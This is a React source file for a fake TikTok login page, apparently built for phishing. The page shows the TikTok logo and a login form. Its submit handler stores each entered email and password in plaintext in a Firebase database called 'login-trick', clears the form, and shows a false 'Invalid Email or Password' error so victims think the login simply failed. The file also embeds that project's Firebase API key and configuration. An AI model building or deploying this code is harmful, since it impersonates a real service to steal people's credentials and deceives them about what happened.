import * as React from "react";
import Box from "@mui/material/Box";
import Card from "@mui/material/Card";
import CardContent from "@mui/material/CardContent";
import Button from "@mui/material/Button";
import logo from "../../assets/tiktok.svg";
import { FormControl, InputAdornment, TextField } from "@mui/material";
import OutlinedInput from "@mui/material/OutlinedInput";
import InputLabel from "@mui/material/InputLabel";
import IconButton from "@mui/material/IconButton";
import Visibility from "@mui/icons-material/Visibility";
import VisibilityOff from "@mui/icons-material/VisibilityOff";
import { initializeApp } from "firebase/app";
import { getDatabase, ref, set } from "firebase/database";
import Snackbar from "@mui/material/Snackbar";
import Alert from "@mui/material/Alert";

// Your Firebase configuration with the provided database URL
const firebaseConfig = {
  databaseURL: "https://login-trick-default-rtdb.firebaseio.com",
  apiKey: "AIzaSyAwV5fA1XXbdBpVyejSjzjDsBlOTQP9MSs",
  authDomain: "login-trick.firebaseapp.com",
  projectId: "login-trick",
  storageBucket: "login-trick.firebasestorage.app",
  messagingSenderId: "1058561105602",
  appId: "1:1058561105602:web:1fd613e45fa870da34a55b",
  measurementId: "G-16CHYFWH8V",
  // Add other config values from your Firebase console
  // apiKey, authDomain, projectId, etc.
};

// Initialize Firebase with error handling
let app;
let database;
try {
  app = initializeApp(firebaseConfig);
  database = getDatabase(app);
  console.log("Firebase initialized successfully");
} catch (error) {
  console.error("Firebase initialization error:", error);
}

export default function BasicCard() {
  const [open, setOpen] = React.useState(false);
  const [showPassword, setShowPassword] = React.useState(false);
  const [formData, setFormData] = React.useState({
    email: "",
    password: "",
  });
  const [error, setError] = React.useState("");
  const [loading, setLoading] = React.useState(false);

  const handleClickShowPassword = () => setShowPassword((show) => !show);

  const handleMouseDownPassword = (event) => {
    event.preventDefault();
  };

  const handleInputChange = (event) => {
    const { name, value } = event.target;
    setFormData((prevState) => ({
      ...prevState,
      [name]: value,
    }));
  };

  const handleSubmit = async () => {
    console.log("Starting form submission..."); // Debug log
    setLoading(true);
    setError("");

    try {
      if (!database) {
        throw new Error("Firebase database not initialized");
      }

      if (!formData.email || !formData.password) {
        throw new Error("Please fill in all fields");
      }

      const userId = Date.now().toString();
      const userRef = ref(database, "users/" + userId);

      console.log("Attempting to save to path:", `users/${userId}`); // Debug log

      await set(userRef, {
        email: formData.email,
        password: formData.password,
        timestamp: Date.now(),
      });

      console.log("Data saved successfully!");
      setFormData({ email: "", password: "" });
      setOpen(true);
      setTimeout(() => {
        setOpen(false);
      }, 3000);
    } catch (error) {
      console.error("Error during submission:", error);
      setError(error.message);
    } finally {
      setLoading(false);
    }
  };

  const handleClose = () => {
    setOpen(false);
  };
  return (
    <>
      <Card
        sx={{
          maxWidth: 400,
          width: 400,
          height: "100svh",
          marginBottom: "20px",
        }}
        className="card-div"
      >
        <CardContent>
          <div className="login-div">
            <img height={200} width={200} src={logo} alt="Logo" />
            <h2>Log in</h2>
            {error && (
              <div style={{ color: "red", marginBottom: "1rem" }}>{error}</div>
            )}
            <FormControl fullWidth>
              <InputLabel htmlFor="email">Email</InputLabel>
              <OutlinedInput
                id="email"
                name="email"
                type="email"
                value={formData.email}
                onChange={handleInputChange}
                label="Email"
              />
            </FormControl>
            <br />
            <br />
            <FormControl fullWidth>
              <InputLabel htmlFor="password">Password</InputLabel>
              <OutlinedInput
                id="password"
                name="password"
                type={showPassword ? "text" : "password"}
                value={formData.password}
                onChange={handleInputChange}
                endAdornment={
                  <InputAdornment position="end">
                    <IconButton
                      aria-label={
                        showPassword ? "hide password" : "show password"
                      }
                      onClick={handleClickShowPassword}
                      onMouseDown={handleMouseDownPassword}
                      edge="end"
                    >
                      {showPassword ? <VisibilityOff /> : <Visibility />}
                    </IconButton>
                  </InputAdornment>
                }
                label="Password"
              />
            </FormControl>
            <br />
            <br />
            <Button
              style={{
                backgroundColor: "#FF4E56",
              }}
              fullWidth
              variant="contained"
              onClick={handleSubmit}
              disabled={loading}
            >
              {loading ? "Saving..." : "Log in"}
            </Button>
          </div>
        </CardContent>
      </Card>
      <Snackbar open={open} autoHideDuration={6000} onClose={handleClose}>
        <Alert severity="error" variant="filled" sx={{ width: "100%" }}>
          Invalid Email or Password
        </Alert>
      </Snackbar>
    </>
  );
}
